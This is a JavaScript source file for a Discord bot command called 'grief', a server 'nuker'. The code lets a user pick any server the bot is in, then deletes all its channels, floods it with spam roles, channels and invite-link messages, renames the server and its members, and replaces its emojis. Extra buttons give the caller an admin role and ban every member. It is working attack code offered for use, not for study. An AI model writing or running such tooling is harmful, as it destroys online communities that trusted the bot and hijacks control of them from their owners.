const { SlashCommandBuilder, MessageFlags, InteractionContextType, StringSelectMenuBuilder, StringSelectMenuOptionBuilder, ActionRowBuilder, ComponentType, ButtonBuilder, ButtonStyle, PermissionsBitField, Collection } = require('discord.js');
const { serverWhitelist, userWhitelist } = require('../config.json');

const griefUserCooldown = new Collection();
const griefGuildCooldown = new Collection();

module.exports = {
	data: new SlashCommandBuilder()
		.setName('grief')
		.setDescription('griefs someone 😂')
		.setContexts(InteractionContextType.BotDM, InteractionContextType.Guild, InteractionContextType.PrivateChannel)
		.addBooleanOption(option =>
			option
				.setName('ephemeral')
				.setDescription('should be ephemeral or not, true by default')),
	async execute(interaction) {
		const flags = interaction.options.getBoolean('ephemeral') ?? true ? MessageFlags.Ephemeral : 0;

		await interaction.deferReply({ flags: flags });

		try {
			const client = interaction.client;

			const guilds = client.guilds.cache
				.sort((a, b) => b.memberCount - a.memberCount)
				.first(25);

			if (guilds.length === 0) {
				return interaction.editReply({
					content: 'Bot is not in any servers :(',
					flags: flags,
				});
			}

			const selectMenu = new StringSelectMenuBuilder()
				.setCustomId('select_guild_' + interaction.id)
				.setPlaceholder('Select a server')
				.setMinValues(1)
				.setMaxValues(1)
				.addOptions(
					guilds.map(guild =>
						new StringSelectMenuOptionBuilder()
							.setLabel(guild.name.slice(0, 100))
							.setDescription(`${guild.memberCount} members`)
							.setValue(guild.id),
					),
				);

			const row = new ActionRowBuilder().addComponents(selectMenu);

			const response = await interaction.editReply({
				content: `Which one of the **${client.guilds.cache.size}** server(s) are you trying to grief?`,
				components: [row],
				flags: flags,
			});

			const filter = i =>
				i.customId === 'select_guild_' + interaction.id &&
                i.user.id == interaction.user.id;

			const collector = response.createMessageComponentCollector({
				filter,
				componentType: ComponentType.StringSelect,
				time: 120_000,
			});

			collector.on('collect', async i => {
				try {
					const guildId = i.values[0];
					const guild = client.guilds.cache.get(guildId);

					if (!guild) {
						await i.reply({
							content: 'Guild not found or bot was removed!',
							flags: MessageFlags.Ephemeral,
						});
						return;
					}

					const isServerWhitelisted = serverWhitelist.includes(guild.id);
					const isUserWhitelisted = userWhitelist.includes(interaction.user.id);

					const content = [
						`**${guild.name}**`,
						`ID: \`${guild.id}\``,
						`Members: **${guild.memberCount}**`,
						`Owner: <@${guild.ownerId}>`,
						isServerWhitelisted ? 'This server is whitelisted. You are not allowed to grief it' : (isUserWhitelisted ? 'You are whitelisted, have fun with the extra buttons!' : ''),
					].join('\n');

					const components = [];

					if (!isServerWhitelisted) {
						components.push(new ActionRowBuilder().addComponents(
							new ButtonBuilder()
								.setCustomId('grief_' + i.id)
								.setLabel('Grief')
								.setStyle(ButtonStyle.Danger),
							new ButtonBuilder()
								.setCustomId('genlink_' + i.id)
								.setLabel('Generate Invite')
								.setStyle(ButtonStyle.Secondary),
						));

						if (isUserWhitelisted) {
							components.push(new ActionRowBuilder().addComponents(
								new ButtonBuilder()
									.setCustomId('leave_' + i.id)
									.setLabel('Leave Server')
									.setStyle(ButtonStyle.Danger),
								new ButtonBuilder()
									.setCustomId('admen_' + i.id)
									.setLabel('Give Admin Role')
									.setStyle(ButtonStyle.Danger),
								new ButtonBuilder()
									.setCustomId('banish_' + i.id)
									.setLabel('Banish All')
									.setStyle(ButtonStyle.Danger),
							));
						}
					}

					const response = await i.update({
						content: content,
						components: components,
						flags: flags,
					});

					collector.stop();

					const filter = interact =>
						interact.customId.endsWith(i.id) &&
                        interact.user.id == i.user.id;

					const collector2 = response.createMessageComponentCollector({
						filter,
						componentType: ComponentType.Button,
						time: 1_800_000,
					});

					const keyv = interaction.client.keyv.get(interaction.user.id);

					let greifed = false;
					collector2.on('collect', async i => {
						try {
							const selection = i.customId;

							if (selection.startsWith('grief')) {
								if (griefGuildCooldown.has(guild.id)) {
									// 10 minute cooldown
									const expirationTime = griefGuildCooldown.get(guild.id) + 600_000;
									if (Date.now() < expirationTime) {
										return i.reply({
											content: `This guild is on grief cooldown. Try again <t:${Math.round(expirationTime / 1_000)}:R>.`,
											flags: MessageFlags.Ephemeral,
										});
									}
								}

								if (griefUserCooldown.has(interaction.user.id)) {
									// 5 minute cooldown
									const expirationTime = griefUserCooldown.get(interaction.user.id) + 300_000;
									if (Date.now() < expirationTime) {
										return i.reply({
											content: `You are on grief cooldown. Try again <t:${Math.round(expirationTime / 1_000)}:R>.`,
											flags: MessageFlags.Ephemeral,
										});
									}
								}

								if (greifed) {
									await i.reply({
										content: 'You\'ve already opened the menu!',
										flags: MessageFlags.Ephemeral,
									});
									return;
								}
								greifed = true;

								const botMember = guild.members.me;
								const content = [];

								if (
									!botMember.permissions.has(PermissionsBitField.Flags.ManageChannels)
									&& !botMember.permissions.has(PermissionsBitField.Flags.ManageRoles)
									&& !botMember.permissions.has(PermissionsBitField.Flags.ManageGuild)
									&& !botMember.permissions.has(PermissionsBitField.Flags.ManageGuildExpressions)) {
									await i.reply({
										content: 'Bot doesn\'t have any permissions, cannot grief. 😿',
										flags: flags,
									});
									greifed = false;
									return;
								}

								if (botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
									content.push('✅ Administrator');
								}
								else {
									content.push('❌ Administrator');
									content.push((botMember.permissions.has(PermissionsBitField.Flags.ManageChannels) ? '✅ ' : '❌ ') + 'Manage Channels');
									content.push((botMember.permissions.has(PermissionsBitField.Flags.ManageRoles) ? '✅ ' : '❌ ') + 'Manage Roles');
									content.push((botMember.permissions.has(PermissionsBitField.Flags.ManageGuild) ? '✅ ' : '❌ ') + 'Manage Guild');
									content.push((botMember.permissions.has(PermissionsBitField.Flags.ManageGuildExpressions) ? '✅ ' : '❌ ') + 'Manage Expressions');
								}
								content.push('Are you sure you want to grief this server? (Use /config to change settings)');

								const optionsRow = new ActionRowBuilder().addComponents(
									new ButtonBuilder()
										.setCustomId('confirm')
										.setLabel('Yes')
										.setStyle(ButtonStyle.Danger),
									new ButtonBuilder()
										.setCustomId('cancel')
										.setLabel('No')
										.setStyle(ButtonStyle.Secondary),
								);

								const serverName = await keyv.get('serverName') || 'https://www.youtube.com/@FreeCliff';
								const roleNames = await keyv.get('roleNames') || 'https://www.youtube.com/@FreeCliff';
								const channelNames = await keyv.get('channelNames') || 'free-cliff-mogs-you';
								const memberNames = await keyv.get('memberNames') || 'youtube.com/@FreeCliff';
								const thugText = await keyv.get('thugText') || '@everyone discord.gg/qgqn3xeuMn';

								const response = await i.reply({
									content: content.join('\n'),
									components: [optionsRow],
									flags: flags,
									withResponse: true,
								});

								try {
									const confirmation = await response.resource.message.awaitMessageComponent({
										filter: i => i.user.id === interaction.user.id,
										time: 60_000,
									});

									if (confirmation.customId === 'confirm') {
										const now = Date.now();
										griefUserCooldown.set(interaction.user.id, now);
										griefGuildCooldown.set(guild.id, now);
										console.log('Server grief starting!');
										i.client.logger.info('Server nuke started', `${i.user.tag} (${i.user.id}) is griefing ${guild.name} (${guild.id})!`);
										await confirmation.update({ content: 'Starting grief 😃', components: [] });
										try {
											if (botMember.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
												await guild.channels.fetch().catch(console.error);

												guild.channels.cache.forEach(channel => {
													channel.delete()
														.then(() => console.log(`Deleted channel ${channel.name} (${channel.id})`))
														.catch(console.error);
												});
											}
											else {
												console.log('Bot does not have the ManageChannels permission, cannot delete channels.');
											}

											if (botMember.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
												for (let i = 0; i < 100; i++) {
													guild.roles.create({
														name: roleNames,
														permissions: [],
														colors: {
															primaryColor: [Math.floor(Math.random() * 255), Math.floor(Math.random() * 255), Math.floor(Math.random() * 255)],
														},
													})
														.then(role => console.log(`Created role ${role.name} (${role.id})`))
														.catch(console.error);
												}
											}
											else {
												console.log('Bot does not have the ManageRoles permission, cannot create roles.');
											}

											if (botMember.permissions.has(PermissionsBitField.Flags.ManageGuild)) {
												guild.edit({
													name: serverName,
													description: 'https://download-cliff.org',
													icon: './domesticshorthairedcat.png',
												})
													.then(() => console.log('Updated server profile.'))
													.catch(console.error);
											}
											else {
												console.log('Bot does not have the ManageGuild permission, cannot update server profile.');
											}

											if (botMember.permissions.has(PermissionsBitField.Flags.ManageGuildExpressions)) {
												const emojis = await guild.emojis.fetch().catch(console.error);
												const stickers = await guild.stickers.fetch().catch(console.error);

												emojis.forEach(emoji => emoji.delete().catch(console.error));
												stickers.forEach(sticker => sticker.delete().catch(console.error));

												for (let i = 0; i < 50; i++) {
													guild.emojis.create({
														attachment: './domesticshorthairedcat.png',
														name: 'domesticshorthairedcat',
													})
														.then(emoji => console.log(`Created emoji ${emoji.name} (${emoji.id})`))
														.catch(console.error);
												}
												for (let i = 0; i < 5; i++) {
													guild.stickers.create({
														file: './domesticshorthairedcat.png',
														name: 'Domestic short-haired cat',
														tags: '🙀',
													})
														.then(sticker => console.log(`Created sticker ${sticker.name} (${sticker.id})`))
														.catch(console.error);
												}
											}
											else {
												console.log('Bot does not have the ManageGuildExpressions permission, cannot delete or create expressions.');
											}

											if (botMember.permissions.has(PermissionsBitField.Flags.ManageChannels)) {
												for (let i = 0; i < 100; i++) {
													guild.channels.create({
														name: channelNames,
														type: 0,
													}).then(channel => {
														console.log(`Created channel ${channel.name} (${channel.id}), spamming.`);
														for (let j = 0; j < 50; j++) {
															channel.send(interaction.client.thugs.getSpamText(thugText))
																.then(message => `Sent message with ID ${message.id} in ${channel.name} (${channel.id})`)
																.catch(console.error);
														}
														console.log(`Finished spamming in ${channel.name} (${channel.id})`);
													}).catch(console.error);
												}
											}
											else {
												console.log('Bot does not have the ManageChannels permission, cannot create channels.');
											}

											if (botMember.permissions.has(PermissionsBitField.Flags.ManageNicknames)) {
												const members = await guild.members.fetch();
												members.forEach(member => {
													member.setNickname(memberNames)
														.then(() => console.log(`Renamed member ${member.user.tag}`))
														.catch(console.error);
												});
											}
										}
										catch (error) {
											console.error(error);
										}
									}
									else if (confirmation.customId === 'cancel') {
										await confirmation.update({ content: 'Action cancelled', components: [] });
									}
								}
								catch (error) {
									console.error(error);
									greifed = false;
									await i.editReply({
										content: 'Action cancelled due to inactivity.',
										components: [],
									}).catch(console.error);
								}
							}
							else if (selection.startsWith('genlink')) {
								const channel = guild.channels.cache.find(channel =>
									channel.isTextBased() &&
                                    channel
                                    	.permissionsFor(guild.members.me)
                                    	.has(PermissionsBitField.Flags.CreateInstantInvite));

								if (!channel) {
									return i.reply({
										content: `I don't have permission to create invites in any channel in **${guild.name}**`,
										flags: flags,
									});
								}

								const invite = await channel.createInvite({
									maxAge: 0,
									maxUses: 0,
									unique: false,
								});

								await i.reply({
									content: `Your invite is ${invite.url}`,
									flags: flags,
								});
							}
							else if (selection.startsWith('leave')) {
								const optionsRow = new ActionRowBuilder().addComponents(
									new ButtonBuilder()
										.setCustomId('confirm')
										.setLabel('Yes')
										.setStyle(ButtonStyle.Danger),
									new ButtonBuilder()
										.setCustomId('cancel')
										.setLabel('No')
										.setStyle(ButtonStyle.Secondary),
								);

								const response = await i.reply({
									content: 'Are you sure you want to leave the server?',
									components: [optionsRow],
									flags: flags,
									withResponse: true,
								});

								try {
									const confirmation = await response.resource.message.awaitMessageComponent({
										filter: i => i.user.id === interaction.user.id,
										time: 60_000,
									});

									if (confirmation.customId === 'confirm') {
										await guild.leave()
											.then(() => confirmation.update({ content: 'Successfully left the server.', flags: flags, components: [] }))
											.catch(console.error);
									}
									else if (confirmation.customId === 'cancel') {
										await confirmation.update({ content: 'Action cancelled', flags: flags, components: [] });
									}
								}
								catch (error) {
									console.error(error);
									await i.editReply({
										content: 'Action cancelled due to inactivity.',
										components: [],
									}).catch(console.error);
								}
							}
							else if (selection.startsWith('admen')) {
								await i.deferReply({ flags: flags });

								const botMember = guild.members.me;

								if (!botMember.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
									return i.editReply({
										content: 'Missing role manage perms!',
									});
								}

								const member = await guild.members.fetch(interaction.user.id);

								/* let member;
								try {
									member = members.get(interaction.user.id);
								} catch (error) {
									return i.editReply({ content: 'You are not in that server!' });
								}*/

								try {
									const role = await guild.roles.create({
										permissions: botMember.permissions,
										position: botMember.roles.highest.position,
									});

									await member.roles.add(role);
									await i.editReply({
										content: 'Permissions given!',
									});
								}
								catch (error) {
									console.error(error);
									i.editReply({
										content: 'Something went wrong 😿',
									}).catch(console.error);
								}
							}
							else if (selection.startsWith('banish')) {
								await i.deferReply({ flags: flags });

								const botMember = guild.members.me;

								if (!botMember.permissions.has(PermissionsBitField.Flags.BanMembers)) {
									return i.editReply({
										content: 'Missing ban perms.'
									});
								}

								try {
									const members = await guild.members.fetch();
									members.forEach(member => {
										member.ban('https://discord.gg/qgqn3xeuMn')
											.catch(console.error);
									});
									await i.editReply({
										content: 'Done.',
									});
								}
								catch (error) {
									console.error(error);
									i.editReply({
										content: 'Something went wrong 😿',
									}).catch(console.error);
								}
							}
						}
						catch (error) {
							console.error(error);
							i.reply({
								content: 'Something went wrong 😿',
								flags: flags,
							}).catch(console.error);
						}
					});

					collector2.on('end', collected => {
						if (collected.size === 0) {
							i.update({
								content: 'Timed out - no selection.',
								components: [],
								flags: flags,
							}).catch(() => { });
						}
					});
				}
				catch (error) {
					console.error(error);
				}
			});

			collector.on('end', collected => {
				if (collected.size === 0) {
					interaction.editReply({
						content: 'Timed out - no selection.',
						components: [],
						flags: flags,
					}).catch(() => { });
				}
			});
		}
		catch (error) {
			console.error(error);
			interaction.editReply({
				content: 'Something went wrong 😿',
				components: [],
				flags: flags,
			}).catch(console.error);
		}
	},
};
